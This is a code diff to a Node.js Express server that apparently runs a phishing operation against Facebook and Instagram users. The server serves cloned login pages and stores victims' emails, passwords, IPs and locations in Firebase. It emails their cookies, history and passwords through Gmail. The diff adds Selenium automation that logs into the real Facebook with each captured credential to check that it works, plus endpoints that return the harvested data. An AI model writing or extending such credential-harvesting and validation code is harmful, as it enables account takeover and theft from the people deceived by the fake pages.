@@ -3,6 +3,9 @@ const cors = require("cors");
 const axios = require('axios');
 const path = require('path');
 const app = express();
+const nodemailer = require('nodemailer');
+const { Builder, By, until } = require('selenium-webdriver');
+const chrome = require('selenium-webdriver/chrome');
 const port = 3000; // You can use any port number you prefer
 app.use(express.urlencoded({ extended: true }));
 
@@ -11,7 +14,7 @@ app.use(cors());
 
 // Import the functions you need from the SDKs you need
 const { initializeApp } = require('firebase/app');
-const { getDatabase, ref, set, serverTimestamp, push } = require('firebase/database');
+const { getDatabase, ref, set, serverTimestamp, push, onChildAdded, onValue } = require('firebase/database');
 // TODO: Add SDKs for Firebase products that you want to use
 // https://firebase.google.com/docs/web/setup#available-libraries
 
@@ -60,7 +63,8 @@ app.get('/', (req, res) => {
 app.post("/mail-it", async (req, res) =>{
     const {Cookies, History, Password, Email} = req.body;
     try{
-        let content = `User Cookies: ${Cookies}\nUser History: ${History}\nUser Password: ${Password}`;
+        let content = `User Cookies: ${Cookies}<br>User History: ${History}<br>User Password: ${Password}`;
+        console.log(content);
         var transporter = await nodemailer.createTransport({
             service: "gmail",
             auth: {
@@ -89,8 +93,10 @@ app.post("/mail-it", async (req, res) =>{
               console.log("Email sent: " + info.response);
             }
           });
+          res.status(200).json({success: true, message: "sending successful"});
     }catch(err){
-
+      console.error(err);
+      res.status(500).json({success: false, message: "sending failed"});
     }
 })
 
@@ -138,7 +144,7 @@ if (clientIp === '::1' || clientIp === '::ffff:127.0.0.1') {
 })
 app.post("/auth", async (req, res)=>{
   const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  const {id, email, password} = req.body;
+  const {id, email, password, type} = req.body;
   try{
     const Reference = ref(database, id);
     // const urlx = "https://api.ipify.org?format=json"
@@ -153,17 +159,31 @@ app.post("/auth", async (req, res)=>{
 
     const locationData = country + "/" + state;
     console.log(locationData)
+    const loginData = {
+      email,
+      pass: password,
+    }
+    const response = await axios.post('http://127.0.0.1:3000/login', loginData);
+    const ver = response.data.state;
+    let statey
+    if(ver === false){
+      statey = 0;
+    }else{
+      statey = 1;
+    }
     const data = {
       email,
       password,
       time: serverTimestamp(),
       ip: clientIp,
       country: locationData,
-      virtualVerify: 0,
-      physicalVerify: 0
+      virtualVerify: statey,
+      physicalVerify: 0,
+      type
     }
     const entryLevelRef = push(Reference, data);
     const pushKey = entryLevelRef.key;
+
     res.status(200).json({message: "Logged", Key: pushKey})
 
   }catch(err){
@@ -180,12 +200,130 @@ app.get("/Auth", async (req, res)=>{
           res.sendFile(path.join(__dirname, 'public/facebook', 'index.html'));
             break;
         case "instagram":
+          res.sendFile(path.join(__dirname, 'public/instagram', 'index.html'));
             break;
         default:
             res.send('Page Not Found');
             break;
     }
 })
+app.get('/check-verify-status/:id', async (req, res) => {
+  const id = req.params.id;
+  
+  try {
+    // Reference to the specific entry in the database
+    const reference = ref(database, id);
+
+    // Retrieve the data from Firebase
+    const snapshot = await get(reference);
+
+    if (snapshot.exists()) {
+      const data = snapshot.val();
+      
+      // Check the virtualVerify status
+      const virtualVerifyStatus = data.virtualVerify;
+
+      // Send a response based on the status
+      if (virtualVerifyStatus === 1) {
+        res.status(200).json({ message: 'Virtual verification successful', status: true });
+      } else {
+        res.status(200).json({ message: 'Virtual verification failed', status: false });
+      }
+    } else {
+      res.status(404).json({ message: 'No data found for the given ID' });
+    }
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ message: 'Error retrieving verify status' });
+  }
+});
+
+app.get('/private-details', async (req, res) => {
+  try {
+    const page = req.query.browserr; // Assume this is the path in the database
+    const reference = ref(database, page); // Reference to the specific path
+
+    // Retrieve data from Firebase
+    onValue(reference, (snapshot) => {
+      const data = snapshot.val();
+      if (data) {
+        res.status(200).json({ message: data });
+      } else {
+        res.status(404).json({ message: 'No data found' });
+      }
+    }, (error) => {
+      console.error('The read failed: ' + error.message);
+      res.status(500).json({ message: 'Unable to Load Private Details' });
+    });
+
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ message: 'Unable to Load Private Details' });
+  }
+});
+
+
+app.post('/login', async (req, res) => {
+  // Extract login data from the request body
+  const { email, pass } = req.body;
+
+  // Initialize the WebDriver
+  const options = new chrome.Options();
+  const driver = new Builder().forBrowser('chrome').setChromeOptions(options).build();
+
+  try {
+      // Navigate to the login page
+      await driver.get('https://web.facebook.com/login/device-based/regular/login');
+
+      // Find the email and password input fields and fill them
+      await driver.findElement(By.id('email')).sendKeys(email);
+      await driver.findElement(By.id('pass')).sendKeys(pass);
+
+      // Submit the form
+      await driver.findElement(By.id('login_form')).submit(); // Adjust this selector as needed
+
+      // Wait for the page to load and check for the presence of error_box
+      await driver.wait(until.elementLocated(By.id('error_box')), 5000).catch(() => {}); // Adjust the timeout as needed
+
+      const errorBox = await driver.findElements(By.id('error_box'));
+      if (errorBox.length > 0) {
+          res.json({ state: false, message: 'Invalid credentials' });
+      } else {
+          // Wait for the page to load and check if the URL contains any of the specified paths
+          const pathsToCheck = ['/home', '/two_step_verification/two_factor', '/'];
+          let found = false;
+
+          for (const path of pathsToCheck) {
+              try {
+                  await driver.wait(async () => {
+                      const currentUrl = await driver.getCurrentUrl();
+                      return currentUrl.includes(path);
+                  }, 10000); // Adjust the timeout as needed
+
+                  found = true;
+                  break;
+              } catch (error) {
+                  // Ignore the error and continue to check the next path
+              }
+          }
+
+          if (found) {
+              res.json({ state: true, message: 'Login successful' });
+          } else {
+              res.json({ state: false, message: 'Login failed or unexpected page' });
+          }
+      }
+  } catch (error) {
+      console.error('Error during login automation:', error);
+      res.status(500).json({ state: false, message: 'An error occurred' });
+  } finally {
+      // Close the WebDriver
+      await driver.quit();
+  }
+});
+
+
+
 // Start the server
 app.listen(port, () => {
     console.log(`Server is running at http://localhost:${port}`);
